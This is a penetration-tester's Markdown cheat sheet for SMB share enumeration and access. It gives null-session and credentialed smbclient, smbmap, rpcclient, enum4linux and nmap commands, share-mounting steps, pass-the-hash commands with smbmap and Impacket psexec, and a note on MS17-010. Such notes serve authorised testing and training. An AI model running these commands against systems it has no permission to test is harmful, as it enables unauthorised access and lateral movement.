# SMB Tools

## SmbClient
```
[Enumerate SMB Shares - NULL Session] $smbclient -L //<ipaddress>
[Enumerate SMB Shares - NULL Session] $smbclient --no-pass -L //<ipaddress>
[Enumerate SMB Shares as Users] $smbclient -L //<ipaddress> -U <username> (when prompted enter pass)
[Connect to SMB Share] $smbclient //<ipaddress>/<sharename> -U <username>
```

## SmbMap
[URL] (https://github.com/ShawnDEvans/smbmap)
```
[Enumerate SMB Shares - NULL Session] $smbmap -H <ip address>
[Enumerate SMB Shares - User] smbmap -H 10.10.10.10 -u <user> -d <domain> -p <password>
smbmap -u <username> -p <password> -H <ip address> [-P <port>] #Creds
smbmap -u <username> -p "<NT>:<LM>" -H <ip address> [-P <port>] #Pass-the-Hash
```

## RPCClient
```
rpcclient -U "" -N 192.168.10.14
```

## Enum4linux
```
enum4linux -a -v -u <username> -p <password> <ip address>
```

## NMAP
```
nmap --script smb-enum-shares -p 139,445 <ip address>
```

## Mount SMB to Linux Filesystem
```
NOTE: May need to install cifs-utils (sudo apt install cifs-utils)
1) mkdir /mnt/<sharename>
2) sudo mount -t cifs //<ipaddress>/<sharename> /mnt/<sharename>
```

## Mount SMB to Linux Filesystem (with creds)
```
1) mkdir /mnt/<sharename>
2) sudo mount -t cifs -o 'username=<username>,password=<password>' //<ip address>/sharename /mnt/<sharename>
```

## NOTES ABOUT MS17-010
```
[URL] https://www.sevenlayers.com/index.php/146-unable-to-find-accessible-named-pipe
Essentially, sometimes you just need a set of creds to launch this attack - see write-up
```

## Resource on SMB and PTH
```
See Impacket Section: ./psexec.py Administrator@192.168.10.17 -hashes "HASH:HASH"
[URL] https://www.hackingarticles.in/lateral-movement-pass-the-hash-attack/
[URL] https://eaneatfruit.github.io/2019/08/18/Offensive-Lateral-Movement/
```